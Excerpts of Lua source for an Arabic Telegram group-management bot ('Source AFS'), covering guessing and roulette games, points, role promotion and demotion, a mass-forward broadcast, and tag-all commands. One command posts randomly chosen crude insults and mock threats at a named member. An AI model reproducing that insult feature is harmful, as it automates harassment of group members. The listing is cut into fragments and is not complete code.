if not DevALS:get(AFS..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(AFS..'ALS:GameNum8'..msg.chat_id_)
...
--     Source AFS     --
if DevALS:get(AFS.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_ALS(msg.chat_id_, msg.id_, 1,"☆︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevALS:get(AFS.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevALS:del(AFS..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevALS:del(AFS.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙*التخمين الصحيح هو* ↫ '..NUM..'\n☆︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevALS:incrby(AFS..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevALS:get(AFS..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevALS:del(AFS..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevALS:del(AFS.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n☆︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevALS:get(AFS..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevALS:get(AFS..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevALS:set(AFS.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙ها هلو عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n☆︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n☆︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevALS:setex(AFS.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source AFS     --
...
if not DevALS:get(AFS..'ALS:Lock:Games'..msg.chat_id_) then
DevALS:del(AFS.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevALS:del(AFS..'ALS:ListRolet'..msg.chat_id_)  
DevALS:setex(AFS.."ALS:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevALS:get(AFS.."ALS:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "☆︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevALS:set(AFS.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '☆︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n☆︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevALS:del(AFS.."ALS:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevALS:get(AFS.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevALS:sismember(AFS..'ALS:ListRolet'..msg.chat_id_,text) then
...
DevALS:sadd(AFS..'ALS:ListRolet'..msg.chat_id_,text)
local CountAdd = DevALS:get(AFS.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevALS:scard(AFS..'ALS:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevALS:del(AFS.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevALS:setex(AFS.."ALS:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح رسائلي",callback_data="/DelMsg:"..msg.sender_user_id_},{text="مسح سحكاتي",callback_data="/DelEdit:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
local Tsl = DevALS:get(AFS..'ALS:Tsl')
local Text = [[
*☆︙ها هلو في قائمة اوامر التسليه ↫ ⤈*
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
*☆︙غنيلي*
*☆︙اغنيه*
*☆︙متحركه*
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="غنيلي",callback_data="/Song:"..msg.sender_user_id_},{text="اغنيه",callback_data="/mp3:"..msg.sender_user_id_}},{{text="متحركه",callback_data="/gif:"..msg.sender_user_id_},{text="صوره",callback_data="/photo:"..msg.sender_user_id_}},{{text="انمي",callback_data="/anime:"..msg.sender_user_id_},{text="ريمكس",callback_data="/remix:"..msg.sender_user_id_}},{{text="ميمز",callback_data="/memz:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..ALS},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..ALS}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..ALS},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..ALS}},{{text = '⌁ AFS TeAM.',url="t.me/CXRCX"}}}
elseif Manager(data) then
...
--     Source AFS     --
if text == "الرابط" then
local Link = DevALS:get(AFS..'ALS:Link')
local Text = [[
*☆︙اختر نوع الرابط لجلبه*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="الرابط نص",callback_data="/LinkText:"..msg.sender_user_id_},{text="الرابط انلاين",callback_data="/Linkinline:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
if not DevALS:get(AFS..'ALS:Lock:Games'..msg.chat_id_) then
local Games = DevALS:get(AFS..'ALS:Games')
local Text = [[
☆︙قائمة العاب الكروب ↫ ⤈
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
☆︙لعبة التخمين ↫ خمن
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="الالعاب المتطوره",callback_data="/GameInline:"..msg.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
...
DevALS0 = (DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevALS:incrby(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevALS0)
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙تم بيع '..(DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n☆︙كل نقطه تساوي 50 رساله', 'md')
DevALS:del(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source AFS     --
...
if ALS.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevALS:sadd(AFS..'ALS:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevALS:sadd(AFS..'ALS:ALSConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ماكو ادمنيه ليتم رفعهم\n☆︙تم رفع مالك الكروب", 1, 'md')
else
...
local msguser = tonumber(DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevALS:get(AFS..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'ماكو' end
...
DevALS:setex(AFS..'DevALS4'..msg.sender_user_id_,360,true)
...
function AFSTeam(extra,result,success)
if DevALS:get(AFS.."ALS:Send:Bot"..AFS) and not ALSSudo(msg) then 
send(msg.chat_id_, msg.id_,"☆︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevALS:smembers(AFS.."ALS:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevALS:smembers(AFS.."ALS:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم اذاعة رسالتك بالتوجيه \n☆︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n☆︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),AFSTeam)
end
end
--     Source AFS     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevALS:set(AFS..'ALS:viewget'..msg.sender_user_id_,true)
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '☆ Source Channel',url="https://t.me/CXRCX"}},{{text = '☆ Developer',url="t.me/BBBVVBV"},{text = '☆ Tws AFS',url="https://t.me/CXRCX"}},{{text= '☆ Exp Source .',url="https://t.me/CXRCX"}}}
local msg_id = msg.id_/2097152/0.5
...
if DevALS:get(AFS.."ALS:Kick:Me"..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevALS:set(AFS..'yes'..msg.sender_user_id_, 'delyes')
DevALS:set(AFS..'no'..msg.sender_user_id_, 'delno')
...
DevALS:set(AFS.."ALS:Kick:Me"..msg.chat_id_, true)
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙ايوالله شلون جان غثه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevALS:del(AFS.."ALS:Kick:Me"..msg.chat_id_)
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل امر اطردني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
end
--     Source AFS     --
if text == "نزلني" and ChCheck(msg) then
if DevALS:get(AFS.."ALS:Del:Me"..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevALS:set(AFS..'yesdel'..msg.sender_user_id_, 'delyes')
DevALS:set(AFS..'nodel'..msg.sender_user_id_, 'delno')
local Text = '☆︙صدك عود تريد انزلك '
keyboard = {} 
...
DevALS:set(AFS.."ALS:Del:Me"..msg.chat_id_, true)
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل امر نزلني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevALS:del(AFS.."ALS:Del:Me"..msg.chat_id_)
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل امر نزلني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
end
--     Source AFS     --
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:TagAll'..msg.chat_id_)
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevALS:get(AFS..'ALS:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "☆︙وينكم يالربع \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevALS:get(AFS..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevALS:get(AFS..'Save:UserName'..v.user_id_).."]\n"
else
...
local EntryNumber = (DevALS:get(AFS..'ALS:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevALS:get(AFS..'ALS:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevALS:get(AFS..'ALS:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل تفاعلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:msg:ALS'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل تفاعلي'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:msg:ALS'..msg.chat_id_,true)  
end
if DevALS:get(AFS.."ALS:msg:ALS"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevALS:get(AFS.."ALS:msg:ALS"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevALS:setex(AFS..'ALS:msg:ALS'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
function prom_reply(extra, result, success) 
get_msg = DevALS:get(AFS.."ALS:msg:ALS"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source AFS     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevALS:get(AFS..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevALS:get(AFS..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == "ايدي الكروب" and ChCheck(msg) then Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ايدي الكروب ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevALS:del(AFS..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source AFS     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevALS:get(AFS..'ALS:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function AFSTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(AFS) then  
...
if DevALS:sismember(AFS.."ALS:ALSConstructor:"..msg.chat_id_,result.id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local AFSTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md') 
local AFSTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_ALS(msg.chat_id_, result.id_, 1,''..AFSTeam[math.random(#AFSTeam)], 1, 'html') 
else  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو غير موجود في الكروب', 1, 'md') 
end 
end 
resolve_username(username,AFSTeam)
end
end
--     Source AFS     --
...
if tonumber(result.sender_user_id_) == tonumber(AFS) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
...
if DevALS:sismember(AFS.."ALS:ALSConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local AFSTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md') 
local AFSTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_ALS(msg.chat_id_, result.id_, 1,''..AFSTeam[math.random(#AFSTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local AFSTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md') 
local AFSTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_ALS(msg.chat_id_, result.id_, 1,''..AFSTeam[math.random(#AFSTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local AFSTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md') 
local AFSTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_ALS(msg.chat_id_, result.id_, 1,''..AFSTeam[math.random(#AFSTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local AFSTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_ALS(msg.chat_id_, msg.id_, 1,AFSTeam, 1, 'md') 
local AFSTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_ALS(msg.chat_id_, result.id_, 1,''..AFSTeam[math.random(#AFSTeam)], 1, 'html') 
else  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو غير موجود في الكروب', 1, 'md') 
end 
...
if DevALS:sismember(AFS..'ALS:ALSSudo:',result.sender_user_id_) then
ALSsudo = 'المطورين الاساسيين • ' else ALSsudo = '' end
if DevALS:sismember(AFS..'ALS:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevALS:sismember(AFS..'ALS:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevALS:sismember(AFS..'ALS:Owner:'..msg.chat_id_, result.sender_user_id_) then
owner = 'المالكين • ' else owner = '' end
if DevALS:sismember(AFS..'ALS:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevALS:sismember(AFS..'ALS:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevALS:sismember(AFS..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevALS:sismember(AFS..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevALS:sismember(AFS..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevALS:sismember(AFS..'ALS:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevALS:srem(AFS..'ALS:ALSSudo:', result.sender_user_id_)
DevALS:srem(AFS..'ALS:SecondSudo:', result.sender_user_id_)
DevALS:srem(AFS..'ALS:SudoBot:', result.sender_user_id_)
DevALS:srem(AFS..'ALS:Owner:'..msg.chat_id_,result.sender_user_id_)
DevALS:srem(AFS..'ALS:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevALS:srem(AFS..'ALS:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevALS:srem(AFS..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_)
DevALS:srem(AFS..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_)
DevALS:srem(AFS..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevALS:srem(AFS..'ALS:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevALS:sismember(AFS..'ALS:ALSSudo:',result.id_) then
ALSsudo = 'المطورين الاساسيين • ' else ALSsudo = '' end
if DevALS:sismember(AFS..'ALS:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevALS:sismember(AFS..'ALS:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevALS:sismember(AFS..'ALS:Owner:'..msg.chat_id_, result.id_) then
owner = 'المالكين • ' else owner = '' end
if DevALS:sismember(AFS..'ALS:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevALS:sismember(AFS..'ALS:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevALS:sismember(AFS..'ALS:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevALS:sismember(AFS..'ALS:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevALS:sismember(AFS..'ALS:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevALS:sismember(AFS..'ALS:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if ALSDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevALS:srem(AFS..'ALS:ALSSudo:', result.id_)
DevALS:srem(AFS..'ALS:SecondSudo:', result.id_)
DevALS:srem(AFS..'ALS:SudoBot:', result.id_)
DevALS:srem(AFS..'ALS:Owner:'..msg.chat_id_,result.id_)
DevALS:srem(AFS..'ALS:BasicConstructor:'..msg.chat_id_,result.id_)
DevALS:srem(AFS..'ALS:Constructor:'..msg.chat_id_,result.id_)
DevALS:srem(AFS..'ALS:Managers:'..msg.chat_id_, result.id_)
DevALS:srem(AFS..'ALS:Admins:'..msg.chat_id_, result.id_)
DevALS:srem(AFS..'ALS:VipMem:'..msg.chat_id_, result.id_)
DevALS:srem(AFS..'ALS:Cleaner:'..msg.chat_id_, result.id_)
elseif ALSDelAll(msg.sender_user_id_,msg.chat_id_) == 'ALSsudo' then
DevALS:srem(AFS..'ALS:SecondSudo:', result.id_)
DevALS:srem(AFS..'ALS:SudoBot:', result.id_)
DevALS:srem(AFS..'ALS:Owner:'..msg.chat_id_,result.id_)
...
DevALS:sadd(AFS..'ALS:ALSSudo:',result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(AFS..'ALS:ALSSudo:',result.id_)
...
DevALS:sadd(AFS..'ALS:ALSSudo:',user)
...
DevALS:srem(AFS..'ALS:ALSSudo:',user)
...
function sudo_reply(extra, result, success)
DevALS:sadd(AFS..'ALS:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevALS:sadd(AFS..'ALS:SecondSudo:',result.id_)
...
DevALS:sadd(AFS..'ALS:SecondSudo:',user)
...
DevALS:srem(AFS..'ALS:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevALS:sadd(AFS..'ALS:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevALS:sadd(AFS..'ALS:SudoBot:',result.id_)
...
DevALS:sadd(AFS..'ALS:SudoBot:',user)
...
DevALS:srem(AFS..'ALS:SudoBot:',user)
...
DevALS:sadd(AFS..'ALS:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevALS:sadd(AFS..'ALS:Owner:'..msg.chat_id_,result.id_)
...
DevALS:sadd(AFS..'ALS:Owner:'..msg.chat_id_,user)
...
DevALS:srem(AFS..'ALS:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not ALSConstructor(msg) and DevALS:get(AFS.."ALS:Lock:ProSet"..msg.chat_id_) then 
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevALS:sadd(AFS..'ALS:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(AFS..'ALS:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevALS:sadd(AFS..'ALS:BasicConstructor:'..msg.chat_id_,user)
...
DevALS:srem(AFS..'ALS:BasicConstructor:'..msg.chat_id_,user)
...
DevALS:sadd(AFS..'ALS:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(AFS..'ALS:Constructor:'..msg.chat_id_,result.id_)
...
DevALS:sadd(AFS..'ALS:Constructor:'..msg.chat_id_,user)
...
DevALS:srem(AFS..'ALS:Constructor:'..msg.chat_id_,user)
...
DevALS:sadd(AFS..'ALS:Managers:'..msg.chat_id_,user)
...
DevALS:srem(AFS..'ALS:Managers:'..msg.chat_id_,user)
...
DevALS:sadd(AFS..'ALS:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevALS:sadd(AFS..'ALS:Cleaner:'..msg.chat_id_,result.id_)
...
DevALS:sadd(AFS..'ALS:Cleaner:'..msg.chat_id_,user)
...
DevALS:srem(AFS..'ALS:Cleaner:'..msg.chat_id_,user)
...
DevALS:sadd(AFS..'ALS:Admins:'..msg.chat_id_,user)
...
DevALS:srem(AFS..'ALS:Admins:'..msg.chat_id_,user)
...
DevALS:sadd(AFS..'ALS:VipMem:'..msg.chat_id_,user)
...
DevALS:srem(AFS..'ALS:VipMem:'..msg.chat_id_,user)
...
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..AFS)
local GetInfo = JSON.decode(Check)
...
AFSTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,AFSTeam[math.random(#AFSTeam)])
end
--     Source AFS     --
...
DevALS:del(AFS.."ALS:Lock:ProSet"..msg.chat_id_)
...
DevALS:set(AFS.."ALS:Lock:ProSet"..msg.chat_id_,"true")
...
if not ALSConstructor(msg) and DevALS:get(AFS.."ALS:Lock:KickBan"..msg.chat_id_) then 
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevALS:sadd(AFS..'ALS:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevALS:get(AFS.."ALS:Lock:KickBan"..msg.chat_id_) then 
